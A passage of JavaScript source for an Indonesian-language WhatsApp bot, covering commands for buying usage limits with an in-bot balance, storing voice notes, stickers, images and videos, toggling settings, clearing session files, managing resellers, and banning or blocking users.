      _Contoh_: ${prefix}buylimit 10

    - Untuk membeli *Limit Game*, ketik:
      ${prefix}buyglimit [jumlah limit game]
      _Contoh_: ${prefix}buyglimit 10

    ⚡ *Atau ketik* .buyprem untuk membeli *Unlimited Limit* 💎
    `;
    setReply(teks);
}
break;
case 'buylimit':{
if (!isGroup) return onlyToko()
if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
if (q.includes('-')) return setReply(`Jangan menggunakan -`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ane = Number(math(q) * 1000)
if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
db.data.users[sender].balance -= ane
db.data.users[sender].limit += math(q)
setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].limit}`)
}
break
case 'buyglimit':{
if (!isGroup) return onlyToko()
if (!q) return setReply(`Kirim perintah *${prefix}buyglimit* jumlah limit yang ingin dibeli\n\nHarga 1 game limit = Rp 700`)
if (q.includes('-')) return setReply(`Jangan menggunakan -`)
if (isNaN(q)) return setReply(`Harus berupa angka`)
let ane = Number(math(q) * 700)
if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
db.data.users[sender].balance -= ane
db.data.users[sender].glimit += math(q)
setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].glimit}`)
}
break
case 'givesaldo':{
if (!isOwner) return onlyOwner()
if(!q) return setReply("Reply target dan Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
db.data.users[mentionByReply].balance += math(q)
setReply(`Berhasil menambakan saldo ke nomer ${mentionByReply.split("@")[0]}`)
}
break
case 'kurangsaldo':{
if (!isOwner) return onlyOwner()
if(!q) return setReply("Reply target dan Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
db.data.users[mentionByReply].balance -= math(q)
setReply(`Berhasil mengurangi saldo ke nomer ${mentionByReply.split("@")[0]}`)
}
break
case 'givelimit':{
if (!isOwner) return onlyOwner()
//if (!isGroupAdmins) return onlyAdmin()
//if (!isBotGroupAdmins) return onlyBadmin()
if(!q) return setReply("Reply target dan Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
db.data.users[mentionByReply].limit += math(q)
setReply(`Berhasil menambakan limit ke nomer ${mentionByReply.split("@")[0]}`)
}
break
case 'kuranglimit':{
if (!isOwner) return onlyOwner()
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
db.data.users[mentionByReply].limit -= math(q)
setReply(`Berhasil mengurangi limit ke nomer ${mentionByReply.split("@")[0]}`)
}
break
case 'caradapetlimit':{
let caranya = Ehztext(`Hai ${pushname} 
🔥 *CARA MUDAH DAPAT LIMIT!* 🔥\n\nKehabisan limit? Jangan khawatir! Kamu bisa mendapatkan limit dengan menukarkan saldo. Yuk, kumpulkan saldo dengan bermain game seru di sini! Setiap kali kamu menjawab benar dalam game, kamu akan mendapatkan hadiah saldo. Jangan lupa klaim saldo kamu setiap hari dengan mengetik *.claimgame*.\n\n📥 *Sudah punya saldo?* Tukarkan saldo tersebut dengan limit menggunakan perintah *.buylimit*. Untuk lebih banyak pilihan, cek toko dengan mengetik *.shopc* sekarang! 💰🔥`)
let { proto, generateWAMessageFromContent } = require('baileys')
let msgs = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: caranya,
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© ɴᴀʜɪᴅᴀ - ᴍᴅ",
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                               "name": "quick_reply",
                                "buttonParamsJson": `{"display_text": "🛒 SHOP", "id": "${prefix}shopc"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text": "🚀 TOP GLOBAL", "id": "${prefix}topglobal"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text": "🧾 CLAIM GAME", "id": "${prefix}claimgame"}`
                            },
                        ],
                    }),
                }),
            },
        },
    }, {quoted: m, userJid: m});

    // Mengirim pesan
    await hanz.relayMessage(m.chat, msgs.message, { messageId: msgs.key.id,
})

}
break

  
 // ========= FITUR STORAGE =========//
  case 'addvn':{
const client = require('filestack-js').init(fileStackApi);
if(!q) return setReply("Nama audionya apa?")
if(db.data.audio[q]) return setReply("Nama tersebut sudah ada di dalam database")

if(isQuotedAudio) {
let media = await hanz.downloadAndSaveMediaMessage(quoted, q)
await client.upload(media, {}, { filename: q }, {}).then(data => {
db.data.audio[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})
let teks = `Berhasil menambahkan audio
ke dalam database dengan nama *${q}*`
await setReply(teks)
await fs.unlinkSync(media)
} else if (isQuotedVideo || isVideo) {
setReply(mess.wait)
let media = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandomFile('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)

await client.upload(buffer453, {}, { filename: q }, {}).then(data => {
db.data.audio[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})

let teks = `Berhasil menambahkan audio
ke dalam database dengan nama *${q}*`
await setReply(teks)



fs.unlinkSync(ran)
})
} else {
setReply("Reply audio/videonya")
}
}
break
case 'delvn':{
if (!isOwner) return onlyOwner()
try {
if(!db.data.audio[q]) return setReply("Nama tersebut tidak ada di dalam data base")
delete db.data.audio[q]
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break
case 'listvn':
{
let teks = '\n\n––––––『 *VOICE NOTE* 』––––––\n\n'
for (let awokwkwk of Object.keys(db.data.audio)) {
teks += `• ${awokwkwk}\n`
}
teks += `\n*Total ada : ${Object.keys(db.data.audio).length}*`
teks += Ehztext(`\n\n📮 *Note:* ↓
• Untuk mengambil vn ketik nama vn
• Gunaka huruf sesuai dengan nama vn
• Dilarang spam berlebihan menggunakan vn
• Request vn silakan hubungi owner\n`)
setReply(teks)
}
break
case 'addstik':{
if (!isOwner) return onlyOwner()
const client = require('filestack-js').init(`${FilestackApi}`)
if(!isQuotedSticker) return setReply("Reply sticker")
if(!q) return setReply("Nama stickernya apa?")
if(db.data.sticker[q]) return setReply("Nama tersebut sudah ada di dalam database")
let media = await conn.downloadAndSaveMediaMessage(quoted, q)
await client.upload(media, {}, { filename: q }, {}).then(data => {
db.data.sticker[q] = {
name: data._file.name,
id: data.handle,
size: FileSize(data._file.size),
link: data.url
}
})
let teks = `Berhasil menambahkan sticker
ke dalam database dengan nama ${q}`
await setReply(teks)
await fs.unlinkSync(media)
}
break
case 'delstik':{
if (!isOwner) return onlyOwner()
if (!q) return setReply("Masukan nama stiker nya")
try {
if(!db.data.sticker[q]) return setReply("Nama tersebut tidak ada di dalam data base")
delete db.data.sticker[q]
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break
case 'liststik':{
if (!isOwner) return onlyOwner()
let teks = '\n\n––––––『 *STICKER LIST* 』––––––\n\n'
for (let awokwkwk of Object.keys(db.data.sticker)) {
teks += `- ${awokwkwk}\n`
}
teks += `\nTotal ada : ${Object.keys(db.data.sticker).length}`
teks += `\n\n📮 *Note:* ↓
• Untuk mengambil sticker ketik nama sticker
• Gunaka huruf sesuai dengan nama sticker
• Dilarang spam berlebihan menggunakan sticker
• Request sticker silakan hubungi owner\n`
setReply(teks)
}
break
case 'addrespon':{
  if(!q) return setReply(`Contoh ${prefix+command} lala|lulu`)
  if(q.length > 100) return setReply("Teks pertama tidak boleh panjang, max 100 huruf")
  let data = q.split("|")[0]
  let respon = q.split("|")[1]

  let listData = global.db.data.respon[data] 	
  if(listData){
    return setReply(`List ${data} sudah ada di database`)
    } else global.db.data.respon[data] = {
    id:senderNumber,
    respon:respon			
    } 
  setReply(`Berhasil menambahkan list ${data}`)
  }
  break
 case 'delrespon':{
      if(!q) return setReply(`Contoh ${prefix+command} lala|lulu`)
      let listData = global.db.data.respon[q]
if(!listData) return setReply(`List ${q} tidak ada di database`)	
if(listData) delete global.db.data.respon[q]
setReply(`Berhasil menghapus respon ${q}`)
    }
    break
case  'listrespon':{
if (!isOwner) return onlyOwner()
let teks = '\n\n––––––『 *RESPON LIST* 』––––––\n\n'
for (let bjir of Object.keys(db.data.respon)) {
teks += `- ${bjir}\n`
}
teks += `\nTotal ada : ${Object.keys(db.data.respon).length}`
teks += `\n\n📮 *Note:* ↓
• Untuk mengambil respon ketik nama respon
• Gunaka huruf sesuai dengan nama respon
• Dilarang spam berlebihan menggunakan respon
• Request respon silakan hubungi owner\n`
setReply(teks)
}
break
case 'addimage':{
if (!m.key.fromMe && !isOwner) return onlyOwner()
if (!isQuotedImage && !isImage) return setReply('Reply imagenya')
if (!q) return setReply('Nama imagenya apa')
let delb = await hanz.downloadAndSaveMediaMessage(quoted)
imagenya.push(q)
await fse.copy(delb,`./temp/image/${q}.jpg`)
fs.writeFileSync('./temp/image.json', JSON.stringify(imagenya))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Image\n dengan nama *${q}*`)
}
break  
case 'delimage':{
if (!isOwner) return onlyOwner() 
try {
let wanu = imagenya.indexOf(q)
imagenya.splice(wanu, 1)
fs.writeFileSync('./temp/image.json', JSON.stringify(imagenya))
fs.unlinkSync(`./temp/image/${q}.jpg`)
setReply(`Sukses delete image ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break
case 'listimage':
{
let teks = '*List Image:*\n\n'
for (let awokwkwk of imagenya) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${imagenya.length}*`
teks += `\n\n*Untuk mengambil image silakan ketik nama image*`
setReply(teks)
}
break
case 'addvideo':{
if (!m.key.fromMe && !isOwner) return onlyOwner()
if (!isQuotedVideo && !isVideo) return setReply('Reply video nya')
if (!q) return setReply('Nama video nya apa?')
let delb = await hanz.downloadAndSaveMediaMessage(quoted)
videonya.push(q) 
await fse.copy(delb, `./temp/video/${q}.mp4`)
fs.writeFileSync('./temp/video.json', JSON.stringify(videonya))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Video\ndengan nama *${q}*`)
}
break
case 'delvideo':{
if(!m.key.fromMe & !isOwner) return onlyOwner()
if (!q) return setReply("Masukan query")
try {
let wanu = videonya.indexOf(q)
videonya.splice(wanu,1)
fs.unlinkSync(`./temp/video/${q}.mp4`)
fs.writeFileSync('./temp/video.json', JSON.stringify(videonya))
setReply(`Succes delete video ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete video ${q}!`)
}
}
break

case 'listvideo':{
let teks = '*video list :*\n\n'
for (let awokwkwk of videonya) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonya.length}*`
setReply(teks)
}
break
 // ========= FITUR SETTINGS ========//
 case 'setthumb':{
if(!isOwner) return onlyOwner()
if(isImage || isQuotedImage){
let delb = await hanz.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/thumb.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image thumb`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break
case  'autosticker':
if (!isOwner) return onlyOwner()
                if (!isOwner) return onlyOwner()
                if (args.length < 1) return setReply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                   autoSticker = true
                    setReply(`Success Mengaktifkan ${prefix + command}`)
                } else if (q == 'off') {
                  autoSticker = false
                    setReply(`Success Mematikan ${prefix + command}`)
                }
            break
 case 'autobio':
if (!isOwner) return onlyOwner()
                if (!isOwner) return onlyOwner()
                if (args.length < 1) return setReply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                   autoBio = true
                    setReply(`Success Mengaktifkan ${prefix + command}`)
                } else if (q == 'off') {
                  autoBio = false
                    setReply(`Success Mematikan ${prefix + command}`)
                }
            break
 case  'autodetectcmd':
if (!isOwner) return onlyOwner()
                if (!isOwner) return onlyOwner()
                if (args.length < 1) return setReply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                   autoDetectCmd = true
                    setReply(`Success Mengaktifkan ${prefix + command}`)
                } else if (q == 'off') {
                  autoDetectCmd = false
                    setReply(`Success Mematikan ${prefix + command}`)
                }
            break
 case 'console':{
	if (!isOwner) return onlyOwner()
	if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (Console === true) return setReply('Udah aktif kak')
	Console = true
	let ih =`Tampilan console telah di aktifkan`
	setReply(ih)
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	 if (Console === false) return setReply('Udah off kak')
	Console = false
	let eh =`Mode auto respon telah di matikan`
	setReply(eh)
	}else if (!q) {
		reply(`MODE CONSOLOE\n${prefix+command} on/off`)
	 }
	 }
	break
  case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
reply(teks) 
await sleep(2000)
setReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
reply("Berhasil menghapus semua kenangan Mantan")     
});
}
break
 case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return setReply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return setReply(teks)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	setReply(teks) 
	
//	await sleep(2000)
	setReply("_Menghapus file Kenangan_ ...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	setReply("_Berhasil menghapus semua Kenangan_ <3")
	 
	});
	  }
	break 
    case 'restart':
	if (!isOwner && !itsMe) return onlyOwner()
	await reply(`_Restarting ${botName}_`)
	await   hanz.sendMessage(from, {text: "_Succes_"})
	await sleep(3000)
	process.send('reset') 
	break
 case 'cleartoxic':
if (!isOwner) return onlyOwner()
setReply("Sukses clear all toxic")
db.data.toxic = []
break
 case 'clearalluser':
	if (!isOwner) return onlyOwner()
	setReply("Sukses clear all User")
	db.data.users = {}
	break 
 case 'blockcmd':
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
	if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
	addblockcmd(q,listcmdblock)         
	setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)          
	break
 case 'unblockcmd':
	try{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply("Textnya mana cih")
	if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
	deleteblockcmd(q, listcmdblock)        
	setReply(`Berhasil unblock command 「 *${q}* 」`)
	} catch (err) {
	setReply("Bjirr error, keknya ada yang error")
	}
	break  
 case 'listblockcmd':{
	let wo = `*「 LIST BLOCK CMD 」*`
	let soso = [];
	for (let i of listcmdblock) {
	soso.push(i.cmd)
	wo += `\n\n•> Command : ${i.cmd}`
	}
	setReply(wo)
	}
	break  
case 'adderror': {
		if (!isOwner) return onlyOwner() 
	if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror menu`)
	if (!m.key.fromMe && !isOwner) return reply (mess.only.ownerB)
	let oke = q.split("|")[0]
	let oka = q.split("|")[1]
	addError(oke, oka, listerror)
	await setReply(`Sukses Menambahkan ${q} ke daftar error`)
	}
	break
 case 'delerror':{
	if (!itsMe && !isOwner) return reply (mess.only.ownerB)
	listerror.splice(q, 1)
	fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
	setReply( `Sukses menghapus ${q} di daftar error`)
	}
	break
case 'clearallerror':
	if (!isOwner) return onlyOwner()
	setReply("SukseS clear all error")
	clearAllError(listerror)
	break 
	case 'listerror': {
	let errornye = `*List Error*\nJumlah : ${db.data.listerror.length}\n\n`
	for (let i of db.data.listerror){          
	errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
	} 
	errornye += `© ${botName}`
	setReply(errornye)
	}
	break
case  'addcmdowner':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
	if(!checkDataName("commands", q, DataId)) { await createDataId("commands", DataId) }
	addDataId(q, "commands", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
	}
	break
	  case  'delcmdowner':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
	  removeDataId ("commands", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	  case 'listcmdowner':{
	  let nana = await DataId.filter(item => item.name == "commands" )
	  let teks ="List Commands For Owner\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
	  case 'addcmdprem':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	addDataId(q, "premium", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
	}
	break
	  case 'delcmdprem':
	 if (!isOwner) return onlyOwner() 
	  if(!q) return setReply(mess.query)
	  try {
	  if(!checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("premium", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	case 'listcmdprem':{
	  if(!checkDataName("premium", q, DataId)) { await createDataId("premium", DataId) }
	  let nana = await DataId.filter(item => item.name == "premium" )
	  let teks ="List Command For Premium User\n\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`• ${toFirstCase(i)}\n`   
		}    
	   teks +=`\n• Total: ${nunu.length}\n` 
	  setReply(teks)
	  }
	  break  
	case  'addcmdlimit':{
	if (!isOwner) return onlyOwner()
	if(!q) return setReply(mess.query)
	if(checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
	if(!checkDataName("limit", q, DataId)) { await createDataId("limit", DataId) }
	addDataId(q, "limit", DataId)
	setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
	}
	break
	  case  'delcmdlimit':
	  if(!q) return setReply(mess.query)
	  if (!isOwner) return onlyOwner() 
	  try {
	  if(!checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
	  removeDataId ("limit", q, DataId)
	  setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
	  } catch (err){
	  console.log(err)
	  setReply(`${err}`)
	  }
	  break
	case 'listcmdlimit':{
	  let nana = await DataId.filter(item => item.name == "limit" )
	  let teks ="List Commands For limit\n"
	  let nunu = nana[0].id
	  for(let i of nunu){
		teks +=`. ${i}\n`   
		}    
	  setReply(teks)
	  }
	  break
 // ========== FITUR OWNER =========== //
case "addreselerpanel": {
    if (!isOwner) return onlyOwner();

    // Cek apakah ada input nomor manual atau pesan yang di-reply
    let targetNumber;

    // Jika ada input manual (q), ambil nomor
    if (args[0]) {
        targetNumber = args[0].replace(/[^0-9]/g, "");  // Ambil nomor dari input dan bersihkan dari karakter non-digit
    } else if (m.quoted) {
        // Jika tidak ada input manual, cek apakah ada pesan yang di-reply
        const quotedMessageSender = m.quoted.sender;  // Mengambil pengirim dari pesan yang di-reply
        targetNumber = quotedMessageSender.split("@")[0];  // Memisahkan nomor dari identifier WA
    } else {
        // Jika tidak ada input manual atau reply pesan
        return reply("Masukkan nomor target (contoh: 62xx) atau reply pesan dari target.");
    }

    // Cek apakah nomor valid di WhatsApp
    let cek1 = await hanz.onWhatsApp(targetNumber + "@s.whatsapp.net");
    if (cek1.length === 0) return reply(`Masukkan nomor yang valid dan terdaftar di WhatsApp!!!`);

    // Tambahkan nomor ke dalam daftar reseller panel
    isResPanel.push(targetNumber);
    fs.writeFileSync("./database/reselerpanel.json", JSON.stringify(isResPanel)); // Simpan daftar yang diperbarui

    // Kirim pesan konfirmasi kepada pemilik baru
    reply(`Sukses sekarang ${targetNumber} adalah Reseller Panel!`);

    await hanz.sendMessage(targetNumber + "@s.whatsapp.net", {
        image: {
            url: `https://pomf2.lain.la/f/7h5xn7n2.jpg`
        },
        caption: `Hallo ${ucapanWaktu} ${targetNumber}!\n\nSelamat! Kamu sekarang adalah Reseller Panel. \n\nJangan ragu untuk menghubungi kami jika ada pertanyaan atau bantuan yang dibutuhkan.`
    }, {
        quoted: m
    });
}
break;
case "delreselerpanel": {
    if (!isOwner) return onlyOwner();

    let targetNumber;

    // Cek apakah ada input nomor manual atau pesan yang di-reply
    if (args[0]) {
        targetNumber = args[0].replace(/[^0-9]/g, "");  // Ambil nomor dari input dan bersihkan dari karakter non-digit
    } else if (m.quoted) {
        // Jika tidak ada input manual, cek apakah ada pesan yang di-reply
        const quotedMessageSender = m.quoted.sender;  // Mengambil pengirim dari pesan yang di-reply
        targetNumber = quotedMessageSender.split("@")[0];  // Memisahkan nomor dari identifier WA
    } else {
        // Jika tidak ada input manual atau reply pesan
        return reply("Masukkan nomor target (contoh: 62xx) atau reply pesan dari target yang ingin dihapus.");
    }

    // Cek apakah nomor ada dalam daftar reseller
    const unp = isResPanel.indexOf(targetNumber);
    if (unp === -1) return reply(`Nomor ${targetNumber} tidak ditemukan dalam daftar reseller.`);

    // Hapus nomor dari daftar reseller panel
    isResPanel.splice(unp, 1);
    fs.writeFileSync("./database/reselerpanel.json", JSON.stringify(isResPanel)); // Simpan daftar yang diperbarui

    // Kirim pesan konfirmasi kepada pengguna yang dihapus
    reply(`✅ Succes Nomor ${targetNumber} berhasil dihapus dari Reseller Panel.`);
}
break;
case "listreselerpanel": {
    const data = isResPanel;
    let teks = "*📋 Daftar Reseller Panel 📋*\n\n";

    if (data.length === 0) {
        teks += "Tidak ada reseller yang terdaftar saat ini.";
    } else {
        teks += "*✨ Daftar Reseller:* \n\n";
        for (const x of data) {
            teks += `🔹 @${x}\n`; // Menggunakan ikon untuk memberikan kesan lebih menarik
        }
    }

    teks += `\n*🔍 Total Reseller:* ${data.length}\n`; // Mengubah tampilan total
    teks += "*📌 Terima kasih telah bergabung dengan kami! 🎉*"; // Pesan penutup

    setReply(teks);
}
break;

case 'ban':{
			let alasan = ""
			if (!isOwner)return setReply('hanya owner') 
			if (q.startsWith("+")) {
			let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
			let Name = await hanz.getName(woke)
			if(cekBannedUser (woke, ban)) return setReply("Udah di ban kak")
			addBanned(Name,calender,woke,alasan, ban)          
			setReply( `Berhasil banned ${woke}`);
			} else  if(users){
			let alasan = mentionByReply? q : mentionByTag? q.split(" ")[1] : "" 
			if(alasan == undefined) alasan = "Tidak ada"
			let Nomer = `${users.split("@")[0]}`
			if(cekBannedUser (Nomer, ban)) return setReply("Udah di ban kak")
			let Name = await hanz.getName(users)
			//if(Nomer === ownerNumber[0]) return setReply("Ga mau") 
			addBanned(Name,calender,Nomer,alasan, ban)               
			setReply( `Berhasil banned ${users.split("@")[0]}`);
			} else setReply('Reply atau tag targetnya')
			}
			break
case 'unban':{
				if (!isOwner)return setReply('hanya owner') 
				if (q.startsWith("+")) {
				let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") 
				if(!cekBannedUser (woke, ban)) return setReply("Udah di unban kak")
				unBanned (woke, ban)             
				setReply( `Berhasil unbanned ${woke}`);
				} else  if(users){
				let Nomer =`${users.split("@")[0]}`
				if(!cekBannedUser (Nomer, ban)) return setReply("Udah di unban kak")
				//if(Nomer === Ownerin) return setReply("Ga mau")
				unBanned (Nomer, ban)             
				setReply( `Berhasil unbanned ${users.split("@")[0]}`);
				} else setReply('Reply atau tag targetnya')
				}
				break
 case 'listban':
//if (!isOwner) return onlyOwner()
let banya = `*List Banned*\nJumlah : ${ban.length}\n\n`
ban.map(function(e, i){
banya +=(i+1)+`. Nomer : wa.me/${e.id}\n└▸ Tanggal : ${e.date}\n└▸ Alasan : ${e.reason} \n\n`            
 });
setReply(banya)
break
case 'clearallban':{
	if (!isOwner) return onlyOwner()
	setReply("Sukses clear all ban")
	let nana = Object.keys(db.data.users)
	let obj = []
	for(let i of nana){
	if(db.data.users[i].banned.status) db.data.users[i].banned.status = false
	}
	}
	break 
case 'block':
	if (!isOwner) return onlyOwner()
	if(isGroup){
	
	if(users){
	await hanz.updateBlockStatus(users, "block")
	setReply(`Sukses block user`)
	} else {
	setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	}
	} else if(!isGroup){
	if(q){
	var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
	if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	await hanz.updateBlockStatus(woke, "block")
	} else if(!q){
	setReply("Masukan nomer yang ingin di block")
	}
	setReply(`Berhasil Block user ${woke.split("@")[0]}`)
	}
	break
 case 'unblock':
	if (!isOwner) return onlyOwner()
	if(isGroup){
	if(users){
	await hanz.updateBlockStatus(users, "unblock")
	await setReply(`Sukses unblock user`)
	} else if(!q){
	setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
	}
	} else if(!isGroup){
	if(q){
	let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
	if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
	if(!woke.startsWith("62")) return setReply("Silakan re�ply pesan atau tag atau input nomer yang mau di block")
	await hanz.updateBlockStatus(woke, "unblock")
	setReply(`Sukses unblock ${woke}`)
	} else if(!q){
	setReply("Masukan nomer yang ingin di unblock")
	}
	
	}
	break
   case 'clearallblock':{
	if (!isOwner) return onlyOwner()
	let obj = [] 
	fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
	await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
	}
	break 
  case 'listblock':{
	let block = await hanz.fetchBlocklist()            
	setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
	}
	break 

case 'getcase': {
    try {
        if (!isOwner && !itsMe) return onlyOwner();
        if (!q) return setReply("*Mau nyari Case apa kak*");
        if (q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix");

        let nana = await getCase(q);

        let { proto, generateWAMessageFromContent } = require('baileys');
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `${gris1}Berikut adalah case Anda\n\n${nana}\n${gris1}`,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "© ɴᴀʜɪᴅᴀ - ᴍᴅ",
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_copy",
                                    "buttonParamsJson": JSON.stringify({
                                        "display_text": "Copy code",
                                        "copy_code": nana
                                    }),
                                },
                            ],
                        }),
                    }),
                },
            },
        }, { quoted: m, userJid: m.sender });

        // Mengirim pesan
        await hanz.relayMessage(m.chat, msgs.message, { messageId: msgs.key.id });

    } catch (err) {
        console.log(err);
        setReply(`Case ${q} tidak ditemukan`);
    }
}
break;
case 'addcase': {
    if (!isOwner) return onlyOwner();

    // Cek apakah ada input setelah perintah 'addcase'
    if (!q) return setReply('Penggunaan salah. Silakan ketik `addcase Fitur` yang ingin ditambahkan.');

